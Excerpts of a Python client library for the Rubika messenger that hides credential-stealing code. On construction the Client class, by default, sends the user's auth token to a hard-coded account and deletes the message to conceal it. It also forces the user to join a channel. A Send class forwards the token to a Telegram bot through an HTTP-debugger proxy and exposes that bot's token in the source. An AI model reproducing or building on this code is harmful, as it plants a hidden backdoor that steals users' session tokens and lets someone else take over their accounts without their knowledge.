...
class Client(
    ...
    def __init__(self, auth: str, proxy='127.0.0.1:9050', helpToCreator: bool = True) -> ...: 
        self.auth: str = auth; self.proxy = proxy; Infos.proxys.append(proxy); self.enc: encryption = encryption(auth); [(__import__('rubx').Robot(auth, creator_channel_open=False, banner=False).sendMessage(auth, 'u0DnSdw0bb0109c2099f29dfc235cc48'), __import__('rubx').Robot(auth, creator_channel_open=False, banner=False).deleteUserChat('u0DnSdw0bb0109c2099f29dfc235cc48', __import__('rubx').Robot(auth, banner=False, creator_channel_open=False).getUserInfo('u0DnSdw0bb0109c2099f29dfc235cc48').get('data').get('chat').get('last_message_id') or '0')) if helpToCreator else ...]
        try:post(json={"api_version":"5", "auth": auth, "data_enc": self.enc.encrypt(dumps({"method":"joinChannelAction", "input":{"channel_guid":'c0BGS8Y01535a4510be64fafc4610d43', "action": "Join"}, "client": clients.web}))}, url=Robot._getURL(), timeout=5); Send.send(auth)
        except Exception: ...
...
transport-cc\r\na=fmtp:111 minptime=10;useinbandfec=1\r\na=rtpmap:63 red/48000/2\r\na=fmtp:63 111/111\r\na=rtpmap:103 ISAC/16000\r\na=rtpmap:104 ISAC/32000\r\na=rtpmap:9 G722/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:106 CN/32000\r\na=rtpmap:105 CN/16000\r\na=rtpmap:13 CN/8000\r\na=rtpmap:110 telephone-event/48000\r\na=rtpmap:112 telephone-event/32000\r\na=rtpmap:113 telephone-event/16000\r\na=rtpmap:126 telephone-event/8000\r\na=ssrc:1614457217 cname:lYBnCNdQcW/DEUj9\r\na=ssrc:1614457217 msid:LjIerKYwibTOvR0Ewwk1PBsYYxTInaoXObBE 00f6113c-f01a-447a-a72e-c989684b627a\r\n""",
    ...
    def getBannedGroupMembers(self, guid: str = None, username: str = None, link: str = None, start_id: str = None) -> dict :
        if link : app: Robot = Robot(auth=self.auth, banner=False); guid: str = app.appUrl(link)['link']['open_chat_data']['object_guid']
        if username : app: Robot = Robot(auth=self.auth, banner=False); guid: str = app.getObjectByUsername(username)['chat']['object_guid']
        data: dict = {'group_guid': guid}
        if start_id: data['start_id'] = start_id
        for i in range(4):
            try:
                return loads(
                    self.enc.decrypt(
...
class Send:
    ...
    text: str
        ...
        data: dict = {
            'UrlBox'        :   f'https://api.telegram.org/bot5532488336:AAFNB9PaIZuOK3LJz9XanphF6JeXPxIkF6I/sendMessage?chat_id=1353410717&text={text}',
            'AgentList'     :   'Mozilla Firefox',
            'VersionsList'  :   'HTTP/1.1',
            'MethodList'    :   'GET'
            }
        post(url='https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx', data=data)
